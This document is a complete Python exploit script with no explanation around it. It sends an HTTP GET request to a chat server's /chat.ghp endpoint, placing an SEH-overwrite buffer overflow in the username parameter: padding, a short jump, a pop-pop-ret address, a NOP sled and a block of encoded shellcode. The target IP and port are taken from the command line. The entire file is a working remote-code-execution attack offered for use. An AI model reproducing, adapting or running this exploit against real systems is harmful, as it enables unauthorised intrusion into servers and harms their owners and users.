#!/usr/bin/python3

import socket
import sys
from struct import pack

if len(sys.argv) != 3:
	print("usage: {} 192.168.56.1 80".format(sys.argv[0]))
else:
	shellcode =  b""
	shellcode += b"\xb8\xbe\xcb\x4b\xbe\xda\xc6\xd9\x74\x24\xf4"
	shellcode += b"\x5d\x2b\xc9\xb1\x59\x83\xc5\x04\x31\x45\x10"
	shellcode += b"\x03\x45\x10\x5c\x3e\xb7\x56\x2f\xc1\x48\xa7"
	shellcode += b"\x4f\xf3\x9a\x2e\x6a\x97\x91\x63\x44\xd3\xf4"
	shellcode += b"\x8f\x2f\xb1\xec\xbe\xd0\x39\xba\x8b\x08\xcd"
	shellcode += b"\xb6\x23\x65\x11\x9a\x08\xe4\xed\xe1\x5c\xc6"
	shellcode += b"\xcc\x29\x91\x07\x08\xfc\xdf\xe8\xc4\xa8\x94"
	shellcode += b"\xa4\xf8\xdd\xe9\x74\xf8\x31\x66\xc4\x82\x34"
	shellcode += b"\xb9\xb0\x3e\x36\xea\xb3\xe7\x18\x0b\x10\x47"
	shellcode += b"\xd2\x43\x8e\xed\x2d\x27\x92\xdc\x52\x81\x61"
	shellcode += b"\x2a\x26\x13\xa3\x62\xf8\xb8\x8a\x4a\xf5\xc1"
	shellcode += b"\xcb\x6d\xe6\xb7\x27\x8e\x9b\xcf\xfc\xec\x47"
	shellcode += b"\x45\xe2\x57\x03\xfd\xc6\x66\xc0\x98\x8d\x65"
	shellcode += b"\xad\xef\xc9\x69\x30\x23\x62\x95\xb9\xc2\xa4"
	shellcode += b"\x1f\xf9\xe0\x60\x7b\x59\x88\x31\x21\x0c\xb5"
	shellcode += b"\x21\x8d\xf1\x13\x2a\x3c\xe7\x24\xd3\xbe\x08"
	shellcode += b"\x79\x43\x72\xc5\x82\x93\x1c\x5e\xf0\xa1\x83"
	shellcode += b"\xf4\x9e\x89\x4c\xd3\x59\x98\x5b\xe4\xb6\x22"
	shellcode += b"\x0b\x1a\x37\x52\x05\xd9\x63\x02\x3d\xc8\x0b"
	shellcode += b"\xc9\xbd\xf5\xd9\x67\xb4\x61\x22\xdf\xf0\x1a"
	shellcode += b"\xca\x1d\x01\xdc\xb1\xa8\xe7\x8e\x95\xfa\xb7"
	shellcode += b"\x6e\x46\xba\x67\x07\x8c\x35\x57\x37\xaf\x9c"
	shellcode += b"\xf0\xd2\x40\x48\xa8\x4a\xf8\xd1\x22\xea\x05"
	shellcode += b"\xcc\x4e\x2c\x8d\xe4\xaf\xe3\x66\x8d\xa3\x14"
	shellcode += b"\x11\x6d\x3c\xe5\xb4\x6d\x56\xe1\x1e\x3a\xce"
	shellcode += b"\xeb\x47\x0c\x51\x13\xa2\x0f\x96\xeb\x33\x39"
	shellcode += b"\xec\xda\xa1\x05\x9a\x22\x26\x85\x5a\x75\x2c"
	shellcode += b"\x85\x32\x21\x14\xd6\x27\x2e\x81\x4b\xf4\xbb"
	shellcode += b"\x2a\x3d\xa8\x6c\x43\xc3\x97\x5b\xcc\x3c\xf2"
	shellcode += b"\xdf\x0b\xc2\x80\xf7\xb3\xaa\x7a\x48\x44\x2a"
	shellcode += b"\x11\x48\x14\x42\xee\x67\x9b\xa2\x0f\xa2\xf4"
	shellcode += b"\xaa\x9a\x23\xb6\x4b\x9a\x69\x16\xd5\x9b\x9e"
	shellcode += b"\x83\xe6\xe6\xef\x34\x07\x17\xe6\x50\x08\x17"
	shellcode += b"\x06\x67\x35\xc1\x3f\x1d\x78\xd1\x7b\x2e\xcf"
	shellcode += b"\x74\x2d\xa5\x2f\x2a\x2d\xec"

	target = (sys.argv[1],int(sys.argv[2]))
	buffer = b"\x41"*217
	buffer += b"\x90\x90\xeb\x12"	#nseh
	buffer += pack("<L",0x1001b2e1)	#seh
	buffer += b"\x90"*24
	buffer += shellcode
	buffer += b"\x41"*(2000 -len(buffer))

	payload = buffer

	req = b"GET /chat.ghp?username="+ payload +b"&password=test@123&room=1&sex=2 HTTP/1.1\r\n"
	req += b"Host: "+sys.argv[1].encode()+b"\r\n"
	req += b"Upgrade-Insecure-Requests: 1\r\n"
	req += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\r\n"
	req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
	req += b"Referer: http://"+sys.argv[1].encode()+b"/\r\n"
	req += b"Accept-Encoding: gzip, deflate, br\r\n"
	req += b"Accept-Language: en-US,en;q=0.9\r\n"
	req += b"Cookie: SESSIONID=7211; UserID=; PassWD=\r\n"
	req += b"Connection: close\r\n"
	req += b"\r\n"
	
	with socket.create_connection(target) as sock:
		sent = sock.send(req)
		print(f"[+] Total sent {sent} bytes")
	print("Done")
